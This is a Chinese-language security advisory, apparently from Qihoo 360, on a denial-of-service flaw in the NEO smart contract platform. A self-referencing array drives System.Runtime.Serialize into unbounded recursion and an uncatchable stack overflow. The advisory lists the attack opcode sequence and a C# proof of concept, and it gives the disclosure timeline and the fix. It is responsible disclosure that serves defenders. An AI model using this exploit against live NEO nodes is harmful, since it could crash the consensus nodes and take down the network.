> 原文链接: https://www.anquanke.com//post/id/156714 


# neo智能合约平台Runtime_Serialize调用拒绝服务漏洞


                                阅读量   
                                **158788**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/dm/1024_576_/t010ec0c936b96bb55c.jpg)](https://p2.ssl.qhimg.com/dm/1024_576_/t010ec0c936b96bb55c.jpg)

作者：Zhiniang Peng from Qihoo 360 core security



NEO是一个非盈利的社区化的区块链项目。它是利用区块链技术和数字身份进行资产数字化，利用智能合约对数字资产进行自动化管理，实现“智能经济”的一种分布式网络。目前Neo市值在coinmarket上排名全球第十五，是备受关注的区块链项目之一。我们在neo智能合约平台中发现一处拒绝服务漏洞，攻击者可利用该漏洞在瞬间使得整个neo网络崩溃。

Neo智能合约平台为合约提供了序列化虚拟机栈上某个对象的系统调用System.Runtime.Serialize。该调用再处理合约请求时未考虑到数组嵌套等问题，将导致智能合约系统平台crash。由于Neo目前是有7个主节点负责验证并打包全网交易。恶意用户将利用该漏洞的恶意合约发布到neo网络中，7个主节点在解析运行该恶意合约时将引发崩溃，进而导致整个neo网络拒绝服务。漏洞细节如下：<br>
System.Runtime.Serialize系统调用会将用户可执行栈顶元素pop出来，然后调用SerializeStackItem函数进行序列化。SerializeStackItem函数内容如下：

[![](https://p0.ssl.qhimg.com/t01bf32fdc0f46d61a3.png)](https://p0.ssl.qhimg.com/t01bf32fdc0f46d61a3.png)

大意是：当合约调用System.Runtime.Serialize系统调用的时候，会对pop出虚拟机栈上的第一个元素(参数StackItem item)，然后进行SerializeStackItem序列化操作,写到binarywriter writer中。SerializeStackItem判断该元素类型，然后进行不同的序列化操作。

其中StackItem有很多类型。如果是数组array类型的话。就会将array的大小和子元素全部再进行一次序列化操作。这里的array是neo自定义的类型。本质上是一个List。此处没有考虑攻击者可能将数组a作为子元素再加入到数组a中。即 a.Add(a)。如果此时再对a进行反序列化，则会进入无限循环。直到程序栈空间耗尽。触发栈溢出异常StackOverflowException。

实际上在Neo虚拟机代码中，我们可以看到虚拟机执行的外层已经对任意异常了捕捉，如下：

[![](https://p4.ssl.qhimg.com/t018125800aa71127b3.png)](https://p4.ssl.qhimg.com/t018125800aa71127b3.png)

但该异常捕捉无法处理StackOverflowException异常。在.net中StackOverflowException 异常会导致整个进程退出，无法catch该异常。进而导致整个neo节点进程直接崩溃。<br>
攻击虚拟机指令： push(a), dup(), dup(), appen(), System.Runtime.Serialize()<br>
则可导致栈溢出异常，程序直接崩溃。【同理，stuct结构，map结构一样可以利用该漏洞】。

值得一提的是，在我们邮件给Neo官方通知漏洞后7分钟内。Neo创始人之一的Erik Zhang就直接回复邮件确认漏洞存在，并在一个小时内提交漏洞修复。效率相当之高。 官方的对该漏洞修复非常干净，通过增加一个序列化后元素的列表List来防止我们攻击中的这种迭代引用。详细见下图：

[![](https://p1.ssl.qhimg.com/t01506604ff3d99624a.png)](https://p1.ssl.qhimg.com/t01506604ff3d99624a.png)



## 漏洞时间线

2018/8/15 15:00发现并测试漏洞<br>
2018/8/15 18:57邮件给Neo官方漏洞细节<br>
2018/8/15 19:04 Neo官方回复确认漏洞存在<br>
2018/8/15 20:00 Neo创始人Erik Zhang提交漏洞修复



## PoC

```
1. using System;
 2. using System.Collections.Generic;
 3. using System.IO;
 4. using System.Linq;
 5. using System.Text;
 6. using System.Threading.Tasks;
 7. using Neo;
 8. using Neo.IO;
 9. using Neo.SmartContract;
 10. using Neo.VM;
 11. using Neo.VM.Types;
 12. using VMArray = Neo.VM.Types.Array;
 13. using VMBoolean = Neo.VM.Types.Boolean;
 14.
 15. namespace ConsoleApp2
 16. `{`
 17. class Program
 18. `{`
 19. public static void SerializeStackItem(StackItem item, BinaryWriter writer)
 20. `{`
 21. switch (item)
 22. `{`
 23. case ByteArray _:
 24. writer.WriteVarBytes(item.GetByteArray());
 25. break;
 26. case VMBoolean _:
 27. writer.Write(item.GetBoolean());
 28. break;
 29. case Integer _:
 30. writer.WriteVarBytes(item.GetByteArray());
 31. break;
 32. case InteropInterface _:
 33. throw new NotSupportedException();
 34. case VMArray array:
 35. writer.WriteVarInt(array.Count);
 36. foreach (StackItem subitem in array)
 37. SerializeStackItem(subitem, writer);
 38. break;
 39. case Map map:
 40. writer.WriteVarInt(map.Count);
 41. foreach (var pair in map)
 42. `{`
 43. SerializeStackItem(pair.Key, writer);
 44. SerializeStackItem(pair.Value, writer);
 45. `}`
 46. break;
 47. `}`
 48. `}`
 49. static void Main(string[] args)
 50. `{`
 51. VMArray a,b;
 52. a = new VMArray();
 53. b = new VMArray();
 54. a.Add(1);
 55. b.Add(2);
 56. MemoryStream ms = new MemoryStream();
 57. BinaryWriter writer = new BinaryWriter(ms);
 58.
 59. RandomAccessStack Stack = new RandomAccessStack();
 60. Stack.Push(a);
 61. Stack.Push(Stack.Peek());
 62. Stack.Push(Stack.Peek());
 63. StackItem newItem = Stack.Pop();
 64. StackItem arrItem = Stack.Pop();
 65. if (arrItem is VMArray aray)
 66. `{`
 67. aray.Add(newItem);
 68. `}`
 69. try
 70. `{`
 71. SerializeStackItem(Stack.Pop(), writer);
 72. `}`
 73. catch (NotSupportedException)
 74. `{`
 75. Console.WriteLine("NotSupportedException");
 76. `}`
 77. catch (StackOverflowException)
 78. `{`
 79. Console.WriteLine("StackOverflowException");
 80. `}`
 81. writer.Flush();
 82.
 83. Console.WriteLine(ms.ToArray().ToHexString());
 84.
 85.
 86. `}`
 87. `}`
```

程序运行结果：

[![](https://p5.ssl.qhimg.com/t0110be951571e76287.png)](https://p5.ssl.qhimg.com/t0110be951571e76287.png)
